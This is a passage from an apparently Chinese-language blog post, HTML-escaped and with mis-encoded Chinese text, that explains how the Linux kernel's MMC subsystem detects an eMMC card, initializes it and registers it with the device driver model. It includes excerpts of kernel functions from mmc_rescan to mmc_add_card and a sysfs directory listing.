    host&lt;/span&gt;-&amp;gt;detect_change = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ...

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å°è¯•è·å¾—hostçš„ä½¿ç”¨æƒï¼Œå®ç°åŸç†åœ¨4.4å°èŠ‚ä¸­æœ‰æåŠ&lt;/span&gt;
&lt;span&gt;    mmc_claim_host(host);
    ... ...

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; rescanæµç¨‹çš„å…³é”®æ­¥éª¤ï¼Œä¾æ¬¡å°è¯•å››ä¸ªç»™å®šé¢‘ç‡ï¼Œç›´è‡³æ£€æµ‹åˆ°mmc cardçš„å­˜åœ¨
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; static const unsigned freqs[] = { 400000, 300000, 200000, 100000 }&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; ARRAY_SIZE(freqs); i++&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!mmc_rescan_try_freq(host, max(freqs[i], host-&amp;gt;&lt;span&gt;f_min)))
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (freqs[i] &amp;lt;= host-&amp;gt;&lt;span&gt;f_min)
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
    }
    mmc_release_host(host);
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_rescan_try_freq(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host, unsigned freq)
{
    host&lt;/span&gt;-&amp;gt;f_init =&lt;span&gt; freq;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å®Œæˆä¸€ç³»åˆ—åˆå§‹åŒ–æ­¥éª¤ï¼Œä¿è¯è®¾å¤‡åœ¨åˆé€‚çš„è¿è¡ŒçŠ¶æ€ï¼Œä¸ºåé¢å®é™…æ¢æµ‹åšå‡†å¤‡&lt;/span&gt;
    mmc_power_up(host, host-&amp;gt;&lt;span&gt;ocr_avail);
    mmc_hw_reset_for_init(host);
    ... ...
    mmc_go_idle(host);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_SD))
        mmc_send_if_cond(host, host&lt;/span&gt;-&amp;gt;&lt;span&gt;ocr_avail);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Order's important: probe SDIO, then SD, then MMC &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; ä¾æ¬¡æ¢æµ‹è®¾å¤‡ï¼šSDIOï¼ŒSDï¼ŒMMC
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å¯¹äºMMCè®¾å¤‡ï¼Œå°è¯•è°ƒç”¨mmc_attach_mmc(host)&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_SDIO))
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_attach_sdio(host))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_SD))
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_attach_sd(host))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_MMC))
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_attach_mmc(host))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    mmc_power_off(host);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;EIO;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan(&amp;amp;host-&amp;gt;detect)&lt;/span&gt;Â ä¼šè°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan_try&lt;span&gt;_freq(host, max(freqs[i], host-&amp;gt;f_min))&lt;/span&gt;&lt;/span&gt;&lt;span&gt;Â ï¼Œè¿›ä¸€æ­¥è°ƒç”¨é‡è¦çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_attach_mmc(host)&lt;/span&gt;Â å‡½æ•°ï¼Œå°†MMCè®¾å¤‡åŠ å…¥åˆ°é©±åŠ¨æ¨¡å‹ä¸­ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;47-mmc_attach_mmchost&quot;&gt;&lt;span&gt;4.7 mmc_attach_mmc(&amp;amp;host)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;19&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; mmc_busç›¸å…³çš„ä¸€ç³»åˆ—operationså‡½æ•°&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_bus_ops mmc_ops =&lt;span&gt; {
    .remove &lt;/span&gt;=&lt;span&gt; mmc_remove,
    .detect &lt;/span&gt;=&lt;span&gt; mmc_detect,
    .suspend &lt;/span&gt;=&lt;span&gt; mmc_suspend,
    .resume &lt;/span&gt;=&lt;span&gt; mmc_resume,
    .runtime_suspend &lt;/span&gt;=&lt;span&gt; mmc_runtime_suspend,
    .runtime_resume &lt;/span&gt;=&lt;span&gt; mmc_runtime_resume,
    .alive &lt;/span&gt;=&lt;span&gt; mmc_alive,
    .shutdown &lt;/span&gt;=&lt;span&gt; mmc_shutdown,
    .hw_reset &lt;/span&gt;=&lt;span&gt; _mmc_hw_reset,
};

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; MMC cardåˆå§‹åŒ–çš„å…¥å£å‡½æ•°&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; mmc_attach_mmc(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    u32 ocr, rocr;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; é¦–å…ˆæ£€æŸ¥hostçš„ä½¿ç”¨æƒæ˜¯å¦å·²ç»è·å¾—&lt;/span&gt;
    WARN_ON(!host-&amp;gt;&lt;span&gt;claimed);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Set correct bus mode for MMC before attempting attach &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_host_is_spi(host))
        mmc_set_bus_mode(host, MMC_BUSMODE_OPENDRAIN);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; OCR registerè·å¾—ï¼Œå¯å‚è€ƒMMCè®¾å¤‡æ“ä½œè§„èŒƒ&lt;/span&gt;
    err = mmc_send_op_cond(host, &lt;span&gt;0&lt;/span&gt;, &amp;amp;&lt;span&gt;ocr);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å°†hostç»“æ„æˆå‘˜bus_opsè®¾ç½®ä¸ºmmc_ops&lt;/span&gt;
    mmc_attach_bus(host, &amp;amp;&lt;span&gt;mmc_ops);
    ... ... 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ä¸ºhosté€‰æ‹©åˆé€‚çš„å·¥ä½œç”µå‹&lt;/span&gt;
    rocr =&lt;span&gt; mmc_select_voltage(host, ocr);

    ... ... 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å…³é”®æ­¥éª¤1ï¼šå¼€å§‹åˆå§‹åŒ–MMC cardçš„æµç¨‹&lt;/span&gt;
    err =&lt;span&gt; mmc_init_card(host, rocr, NULL);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; MMC cardåˆå§‹åŒ–åé‡Šæ”¾hostçš„ä½¿ç”¨æƒï¼Œèµ·åˆåœ¨mmc_rescan()å‡½æ•°ä¸­è·å¾—&lt;/span&gt;
&lt;span&gt;    mmc_release_host(host);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å…³é”®æ­¥éª¤2ï¼šå°†MMC cardæ³¨å†Œè¿›è®¾å¤‡é©±åŠ¨æ¨¡å‹ä¸­&lt;/span&gt;
    err = mmc_add_card(host-&amp;gt;&lt;span&gt;card);

    mmc_claim_host(host);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ... 
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_attach_mmc(&amp;amp;host)&lt;/span&gt;Â ä½œä¸ºMMC cardæ£€æµ‹å’Œåˆå§‹åŒ–çš„å…³é”®å‡½æ•°ï¼Œæ‰§è¡Œçš„æ­¥éª¤å¯æ¦‚æ‹¬ä¸ºï¼š&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;è·å–MMCåŸºæœ¬ç¡¬ä»¶åˆå§‹åŒ–ä¿¡æ¯ï¼Œä¾‹å¦‚OCR register ï¼ˆå·¥ä½œç”µå‹ç›¸å…³ï¼‰&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;åˆå§‹åŒ–host-&amp;gt;bus_opsæˆå‘˜ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;bus_ops = &amp;amp;mmc_ops&lt;/span&gt;Â &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_card(host, rocr, NULL)&lt;/span&gt;Â ï¼šMMC cardåˆå§‹åŒ–ï¼Œä¸‹æ–‡è¯¦ç»†ä»‹ç»&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_card(host-&amp;gt;card)&lt;/span&gt;Â ï¼šå°†MMC cardåŠ å…¥åˆ°è®¾å¤‡é©±åŠ¨æ¨¡å‹ä¸­ï¼Œä¸‹æ–‡å°†è¯¦ç»†ä»‹ç»&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;48-mmc_init_mmchost-rocr-null&quot;&gt;&lt;span&gt;4.8 mmc_init_mmc(&amp;amp;host, rocr, NULL)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;34&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;23.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; device_type mmc_type =&lt;span&gt; {
    .groups &lt;/span&gt;=&lt;span&gt; mmc_std_groups,
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_init_card(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, u32 ocr, &lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;oldcard)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    u32 cid[&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;&lt;span&gt;];
    u32 rocr;

    WARN_ON(&lt;/span&gt;!host-&amp;gt;&lt;span&gt;claimed);

    ... ...
    mmc_go_idle(host);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; The extra bit indicates that we support high capacity &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    err &lt;/span&gt;= mmc_send_op_cond(host, ocr | (&lt;span&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span&gt;30&lt;/span&gt;), &amp;amp;&lt;span&gt;rocr);

    ... ... 
    err &lt;/span&gt;=&lt;span&gt; mmc_send_cid(host, cid);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (oldcard) {
        ...
        card &lt;/span&gt;=&lt;span&gt; oldcard;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åŠ¨æ€åˆ†é…mmc_cardç»“æ„&lt;/span&gt;
        card = mmc_alloc_card(host, &amp;amp;&lt;span&gt;mmc_type);

        card&lt;/span&gt;-&amp;gt;ocr =&lt;span&gt; ocr;
        card&lt;/span&gt;-&amp;gt;type =&lt;span&gt; MMC_TYPE_MMC;
        card&lt;/span&gt;-&amp;gt;rca = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        memcpy(card&lt;/span&gt;-&amp;gt;raw_cid, cid, &lt;span&gt;sizeof&lt;/span&gt;(card-&amp;gt;&lt;span&gt;raw_cid));
    }

    ... ...
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; mmc_card *mmc_alloc_card(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, &lt;span&gt;struct&lt;/span&gt; device_type *&lt;span&gt;type)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card;

    card &lt;/span&gt;= kzalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_card), GFP_KERNEL);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;card)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ERR_PTR(-&lt;span&gt;ENOMEM);

    card&lt;/span&gt;-&amp;gt;host =&lt;span&gt; host;

    device_initialize(&lt;/span&gt;&amp;amp;card-&amp;gt;&lt;span&gt;dev);

    card&lt;/span&gt;-&amp;gt;dev.parent =&lt;span&gt; mmc_classdev(host);
    card&lt;/span&gt;-&amp;gt;dev.bus = &amp;amp;&lt;span&gt;mmc_bus_type;
    card&lt;/span&gt;-&amp;gt;dev.release =&lt;span&gt; mmc_release_card;
    card&lt;/span&gt;-&amp;gt;dev.type =&lt;span&gt; type;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; card;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_mmc(&amp;amp;host, rocr, NULL)&lt;/span&gt;Â ä¼šè°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_card(host, &amp;amp;mmc_type)&lt;/span&gt;Â åŠ¨æ€åˆ†é…ä¸€ä¸ªÂ &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card&lt;/span&gt;Â ç»“æ„ï¼Œå¹¶åˆå§‹åŒ–å…¶å†…éƒ¨çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; device&lt;/span&gt;Â ç»“æ„ã€‚æ­¤å¤–ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_mmc()&lt;/span&gt;Â ä¸­è¿˜å®Œæˆäº†è®¸å¤šåˆå§‹åŒ–å·¥ä½œï¼Œè¿™äº›å·¥ä½œå¤§å¤šæ˜¯ä¾æ®MMCæ“ä½œè§„èŒƒå®šä¹‰çš„ï¼Œåœ¨æ­¤ä¸è¯¦ç»†ä»‹ç»ã€‚&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card&lt;/span&gt;Â ç»“æ„æˆå‘˜å¤§è‡´åˆ—ä¸¾å¦‚ä¸‹ï¼Œä»¥æ–¹ä¾¿åˆ†æã€‚&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; mmc_card card =&lt;span&gt; {
    .host &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc;

    .dev &lt;/span&gt;=&lt;span&gt; {
        .parent     &lt;/span&gt;= mmc_classdev(mmc) = &amp;amp;&lt;span&gt;(mmc.class_dev);
        .bus        &lt;/span&gt;= &amp;amp;mmc_bus_type =&lt;span&gt; {
            .name       &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            .dev_groups &lt;/span&gt;=&lt;span&gt; mmc_dev_groups,
            .match      &lt;/span&gt;=&lt;span&gt; mmc_bus_match,
            .uevent     &lt;/span&gt;=&lt;span&gt; mmc_bus_uevent,
            .probe      &lt;/span&gt;=&lt;span&gt; mmc_bus_probe,
            .remove     &lt;/span&gt;=&lt;span&gt; mmc_bus_remove,
            .shutdown   &lt;/span&gt;=&lt;span&gt; mmc_bus_shutdown,
            .pm         &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc_bus_pm_ops,
        };

        .release    &lt;/span&gt;=&lt;span&gt; mmc_release_card;
        .type       &lt;/span&gt;= &amp;amp;mmc_type =&lt;span&gt; {
            .groups &lt;/span&gt;=&lt;span&gt; mmc_std_groups,
        };
    }
    .ocr            &lt;/span&gt;=&lt;span&gt; rocr;
    .type           &lt;/span&gt;=&lt;span&gt; MMC_TYPE_MMC;
    .rca            &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;;                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; relative card address of device&lt;/span&gt;
};
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;49-mmc_add_cardhost-card&quot;&gt;&lt;span&gt;4.9 mmc_add_card(host-&amp;gt;card)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;int&lt;/span&gt; mmc_add_card(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; ret;

    ... ...
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; #define mmc_hostname(x) (dev_name(&amp;amp;(x)-&amp;gt;class_dev))
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ä¸ºcard-&amp;gt;devè®¾ç½®åç§°â€œmmc0:0001â€ï¼Œå®é™…ä¸Šè®¾ç½®äº†card-&amp;gt;dev-&amp;gt;kobj.name = â€œmmc0:0001â€&lt;/span&gt;
    dev_set_name(&amp;amp;card-&amp;gt;dev, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%s:%04x&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, mmc_hostname(card-&amp;gt;host), card-&amp;gt;&lt;span&gt;rca);

    ... ...
    card&lt;/span&gt;-&amp;gt;dev.of_node = mmc_of_find_child_device(card-&amp;gt;host, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    device_enable_async_suspend(&lt;/span&gt;&amp;amp;card-&amp;gt;&lt;span&gt;dev);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å…³é”®æ­¥éª¤ï¼šé€šè¿‡device_add() å°†mmc cardæ³¨å†Œåˆ°è®¾å¤‡é©±åŠ¨æ¨¡å‹ä¸­&lt;/span&gt;
    ret = device_add(&amp;amp;card-&amp;gt;&lt;span&gt;dev);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; æ ‡è®°mmc cardçŠ¶æ€ä¸ºPRESENTï¼Œcard-&amp;gt;state = MMC_STATE_PRESENT&lt;/span&gt;
&lt;span&gt;    mmc_card_set_present(card);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;è¿™é‡Œæœ€å…³é”®çš„ä¸€æ­¥æ˜¯ç†Ÿæ‚‰çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;device_add(&amp;amp;card-&amp;gt;dev)&lt;/span&gt;Â å‡½æ•°ï¼Œå®ƒå°†mmc cardæ·»åŠ åˆ°é©±åŠ¨æ¨¡å‹ä¸­ã€‚æ³¨æ„åˆ°Â &lt;span class=&quot;cnblogs_code&quot;&gt;card.dev&lt;/span&gt;Â çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;parent&lt;/span&gt;Â è¢«è®¾ç½®ä¸ºÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc.class_dev&lt;/span&gt;Â ï¼Œæ‰€ä»¥å°†åœ¨å‰è¿°hostçš„ç›®å½•å±‚æ¬¡ä¸‹å»ºç«‹æ–°çš„åä¸ºÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc0:&lt;span&gt;0001&lt;/span&gt;&lt;/span&gt;Â çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;card&lt;/span&gt;Â å­ç›®å½•ï¼Œè€Œåœ¨è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;bus_add_device()&lt;/span&gt;Â æ—¶ï¼Œåœ¨mmc busç›®å½•ä¸‹å­ç›®å½•Â &lt;span class=&quot;cnblogs_code&quot;&gt;devices&lt;/span&gt;Â å»ºç«‹ç›¸åº”çš„é“¾æ¥ï¼Œé“¾æ¥åˆ°ä¸Šè¿°Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc0:&lt;span&gt;0001&lt;/span&gt;&lt;/span&gt;Â çš„è®¾å¤‡ç›®å½•ä¸Šã€‚sysfsçš„æ•´ä½“ç›®å½•å±‚æ¬¡è¡¨ç°å¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
/sys/devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/mmc0:&lt;span&gt;0001&lt;/span&gt;&lt;span&gt;$ ll
total &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
 ... ...  block&lt;/span&gt;/&lt;span&gt;
 ... ...  
 ... ...  driver &lt;/span&gt;-&amp;gt; ../../../../../../bus/mmc/drivers/mmcblk/&lt;span&gt;
 ... ...
 ... ...  subsystem &lt;/span&gt;-&amp;gt; ../../../../../../bus/mmc/&lt;span&gt;
 ... ...
 ... ...  uevent

&lt;/span&gt;/sys/bus/mmc/&lt;span&gt;devices$ ll
 ... ...  mmc0:&lt;/span&gt;&lt;span&gt;0001&lt;/span&gt; -&amp;gt; ../../../devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/mmc0:&lt;span&gt;0001&lt;/span&gt;/


/sys/bus/mmc/drivers/&lt;span&gt;mmcblk$ ll
 ... ...  mmc0:&lt;/span&gt;&lt;span&gt;0001&lt;/span&gt; -&amp;gt; ../../../../devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/mmc0:&lt;span&gt;0001&lt;/span&gt;/

/sys/&lt;span&gt;class&lt;/span&gt;/&lt;span&gt;mmc_host$ ll
 ... ...  mmc0 &lt;/span&gt;-&amp;gt; ../../devices/platform/klm_emmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/ 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;æŒ‰ç…§Linuxé©±åŠ¨æ¨¡å‹ï¼Œæ¥ä¸‹æ¥è¦å®Œæˆçš„æ˜¯è®¾å¤‡å’Œé©±åŠ¨åœ¨æ€»çº¿ä¸Šçš„åŒ¹é…å·¥ä½œï¼Œæœ€ç»ˆè°ƒç”¨é©±åŠ¨çš„&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;probe()&lt;/code&gt;å‡½æ•°ã€‚è°ƒç”¨çš„å‡½æ•°ä¾æ¬¡æ˜¯ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
mmc_bus_probe(&amp;amp;card.dev) --&amp;gt; mmc_blk_probe(&amp;amp;card)
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;Linuxå—è®¾å¤‡é©±åŠ¨åˆå§‹åŒ–ä¸€èˆ¬åŒ…æ‹¬å¦‚ä¸‹å‡ ä¸ªæ–¹é¢ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;ç”³è¯·è®¾å¤‡å·ï¼Œå¹¶å°†å—è®¾å¤‡é©±åŠ¨æ³¨å†Œåˆ°å†…æ ¸ã€‚Â &lt;span class=&quot;cnblogs_code&quot;&gt;register_blkdev()&lt;/span&gt;Â &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;åˆå§‹åŒ–è¯·æ±‚é˜Ÿåˆ—ã€‚Â &lt;span class=&quot;cnblogs_code&quot;&gt;blk_init_queue() / blk_alloc_queue()&lt;/span&gt;Â &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;åˆ†é…gendiskç»“æ„ï¼Œå¹¶è¿›è¡Œåˆå§‹åŒ–ã€‚Â &lt;span class=&quot;cnblogs_code&quot;&gt;alloc_disk()&lt;/span&gt;Â &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;æ·»åŠ gendiskã€‚Â &lt;span class=&quot;cnblogs_code&quot;&gt;add_disk()&lt;/span&gt;Â &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;ç¬¬3èŠ‚MMCé©±åŠ¨æ³¨å†Œä¸­ï¼Œå‡½æ•°Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_init()&lt;/span&gt;Â è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;register_blkdev(MMC_BLOCK_MAJOR, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)&lt;/span&gt;Â å®Œæˆäº†è®¾å¤‡å·çš„ç”³è¯·ï¼Œå°†å—è®¾å¤‡æ³¨å†Œåˆ°å†…æ ¸ä¸­ã€‚ä¸‹æ–‡å°†ä»Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_probe(card)&lt;/span&gt;å…¥æ‰‹åˆ†æå…¶ä»–å‡ ä¸ªæ­¥éª¤çš„å®ç°ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;51-mmc_blk_probecard&quot;&gt;&lt;span&gt;5.1 mmc_blk_probe(card)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;18&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_blk_data {
